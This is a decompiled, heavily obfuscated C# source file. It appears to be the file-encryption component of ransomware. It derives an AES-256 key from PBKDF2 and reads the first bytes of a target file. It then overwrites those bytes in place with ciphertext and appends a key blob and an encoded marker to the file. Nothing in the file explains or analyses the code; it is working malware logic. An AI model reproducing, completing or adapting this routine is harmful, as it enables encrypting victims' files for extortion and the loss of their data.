using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace sWduCclqEzKrM;

public static class WZCHsryCBLJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] UMjuORBkcFPFXB(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = WNvKbVupweLdc(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes WNvKbVupweLdc(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] gsYSnbeqzsbU(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (wJkbnIWOteHAMM.kQqMJAvESmfL == getString_0(107397076))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (wJkbnIWOteHAMM.nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(wJkbnIWOteHAMM.VjgrxEUFvvHY, getString_0(107363253) + string_0 + getString_0(107377073) + ex.Message + getString_0(107396385));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void MGSLxQyqoUi(string ZSIfqWNKFN, byte[] qznoWitgOpFxI, byte[] kLphRdsGImxW = null)
	{
		try
		{
			byte[] array = null;
			if (wJkbnIWOteHAMM.kQqMJAvESmfL == getString_0(107397076))
			{
				array = (wJkbnIWOteHAMM.tRSKQaCWVf ? Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015))) : Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZSIfqWNKFN, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qznoWitgOpFxI, 0, qznoWitgOpFxI.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ZSIfqWNKFN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!wJkbnIWOteHAMM.tRSKQaCWVf)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(kLphRdsGImxW, 0, kLphRdsGImxW.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (wJkbnIWOteHAMM.tRSKQaCWVf ? Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015))) : Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992))));
			FileStream fileStream2 = new FileStream(ZSIfqWNKFN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(qznoWitgOpFxI, 0, qznoWitgOpFxI.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(ZSIfqWNKFN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!wJkbnIWOteHAMM.tRSKQaCWVf)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(kLphRdsGImxW, 0, kLphRdsGImxW.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (wJkbnIWOteHAMM.nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(wJkbnIWOteHAMM.VjgrxEUFvvHY, getString_0(107363253) + ZSIfqWNKFN + getString_0(107376974) + ex.Message + getString_0(107396385));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (wJkbnIWOteHAMM.tRSKQaCWVf ? Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107377015))) : Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(wJkbnIWOteHAMM.CdpVqTSZopwWL) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992)) + Convert.ToString(wJkbnIWOteHAMM.nnEkTZqriSbg) + wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107376992))));
			FileStream fileStream4 = new FileStream(ZSIfqWNKFN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(qznoWitgOpFxI, 0, qznoWitgOpFxI.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(ZSIfqWNKFN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!wJkbnIWOteHAMM.tRSKQaCWVf)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(kLphRdsGImxW, 0, kLphRdsGImxW.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static WZCHsryCBLJ()
	{
		Strings.CreateGetStringDelegate(typeof(WZCHsryCBLJ));
	}
}
